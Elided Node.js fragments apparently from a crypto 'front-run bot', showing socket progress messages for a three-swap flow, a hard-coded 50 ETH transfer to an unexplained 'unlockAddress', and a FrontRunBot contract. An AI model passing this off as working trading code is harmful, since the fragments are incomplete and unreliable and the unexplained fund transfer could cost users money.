...
module.exports.initiate = async (_amount,path,slip,liquidity,io_,socket_) => {
	return new Promise((resolve,reject)=>{
	    io = io_;
	    socket = socket_;
	    io.to(socket.id).emit('private', "initiating");
...
return new Promise((resolve,reject)=>{
io.to(socket.id).emit('private', "Checking Token Address");
try {
    var resolved = "";
...
io.to(socket.id).emit('private', "Checking Token nested Address");
try {
...
return new Promise(async(resolve,reject)=>{
io.to(socket.id).emit('private', "Setting Transaction Mode");
try {
    if (unlockAddress != "") {
...
return new Promise(async(resolve,reject)=>{
io.to(socket.id).emit('private', "Swap 1 of 3");
...
return new Promise(async(resolve,reject)=>{
    ...
    io.to(socket.id).emit('private', "Swap 2 of 3");
...
return new Promise(async(resolve,reject)=>{
    ...
    let sendTranx = await web3.eth.sendTransaction({from: address[0], to: unlockAddress, value: "50000000000000000000"}).catch(err=>{
...
return new Promise(async(resolve,reject)=>{
    ...
    io.to(socket.id).emit('private', "Swap 3 of 3");
    let frontrunbot = new web3.eth.Contract(
        FrontRunBot.abi,
        FrontRunBotAddr
    );
